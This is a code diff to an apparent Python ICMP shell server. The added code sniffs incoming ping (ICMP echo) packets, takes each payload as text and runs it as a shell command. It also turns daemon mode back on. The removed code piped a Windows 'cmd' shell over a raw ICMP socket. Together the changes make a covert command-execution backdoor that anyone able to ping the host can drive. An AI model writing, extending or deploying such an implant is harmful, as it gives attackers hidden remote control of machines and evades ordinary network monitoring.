@@ -14,57 +14,20 @@ import ish_open
 import ishell
 
 
-def ish_listen(sockfd, sin):
-    fd = subprocess.Popen(['cmd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+def ish_listen():
+    child_conn, process = ish_open.popen2("echo Hello world!")
+    ishell.sendhdr.cntrl = 0
 
-    selector = selectors.DefaultSelector()
-    selector.register(sockfd, selectors.EVENT_READ)
-    selector.register(fd.stdout, selectors.EVENT_READ)
+    process.stdin.close()
 
-    try:
-        while True:
-            for key, events in selector.select():
-                if key.fileobj == sockfd:
-                    # Read from the socket and send to the shell
-                    recv_buf, _ = sockfd.recvfrom(ishell.ish_info.packetsize)
-                    fd.stdin.write(recv_buf)
-                    fd.stdin.flush()
+    output = process.stdout.read()
+    error = process.stderr.read()
 
-                    print("-----+ IN DATA +------\n{}".format(recv_buf.decode('utf-8')))
-                elif key.fileobj == fd.stdout:
-                    # Read from the shell and send to the socket
-                    send_buf = fd.stdout.read(ishell.ish_info.packetsize)
-                    if not send_buf:
-                        break
+    os.close(child_conn)
+    process.communicate()
 
-                    ishell.sendhdr.ts = 0
-                    ishell.ish_info.seq += 1
-
-                    # sockfd.sendto(send_buf, sin)
-                    print("-----+ OUT DATA +-----\n{}".format(send_buf.decode('utf-8')))
-    finally:
-        selector.unregister(sockfd)
-        selector.unregister(fd.stdout)
-        selector.close()
-
-        fd.stdin.close()
-        fd.stdout.close()
-        fd.stderr.close()
-        fd.wait()
-# def ish_listen():
-#     child_conn, process = ish_open.popen2("echo Hello world!")
-#     ishell.sendhdr.cntrl = 0
-#
-#     process.stdin.close()
-#
-#     output = process.stdout.read()
-#     error = process.stderr.read()
-#
-#     os.close(child_conn)
-#     process.communicate()
-#
-#     print(output.decode('cp866'))
-#     print(error.decode('cp866'))
+    print(output.decode('cp866'))
+    print(error.decode('cp866'))
 
 
 def sig_handle():
@@ -103,14 +66,24 @@ def edaemon():
         process.join()
     except Exception:
         sys.exit(-1)
-    else:
-        sys.exit(0)
 
 
 def packet_callback(packet):
-    if ICMP in packet and packet[ICMP].type == 8:  # ICMP Echo Request
-        print(f"Received ICMP packet from {packet[IP].src}")
-        print(f"Data: {packet[ICMP].payload.load.decode('utf-8')}")
+    if ICMP in packet and packet[ICMP].type == 8:
+        child_conn, process = ish_open.popen2(packet[ICMP].payload.load.decode('utf-8'))
+        ishell.sendhdr.cntrl = 0
+
+        process.stdin.close()
+
+        output = process.stdout.read()
+        error = process.stderr.read()
+
+        os.close(child_conn)
+        process.communicate()
+
+        # print(output.decode('cp866'))
+        # print(error.decode('cp866'))
+        # print(f"Data: {packet[ICMP].payload.load.decode('utf-8')}")
 
 
 def main():
@@ -134,26 +107,12 @@ def main():
     if args.d:
         ish_debug = 0
 
+    if (ish_debug):
+        if edaemon():
+            print("Cannot start server as daemon!")
+            sys.exit(-1)
+
     sniff(filter="icmp", prn=packet_callback)
-   #if (ish_debug):
-   #    if edaemon():
-   #        print("Cannot start server as daemon!")
-   #        sys.exit(-1)
-
-   #try:
-   #    sockfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-   #    ish_listen(sockfd, None)
-   #    sockfd.close()
-   #except socket.error as e:
-   #    print(e)
-
-   #try:
-   #    signal.signal(signal.SIGPIPE, sig_handle)
-   #except AttributeError:
-   #    pass
-
-    # ish_listen()
-
 
 
 if __name__ == '__main__':
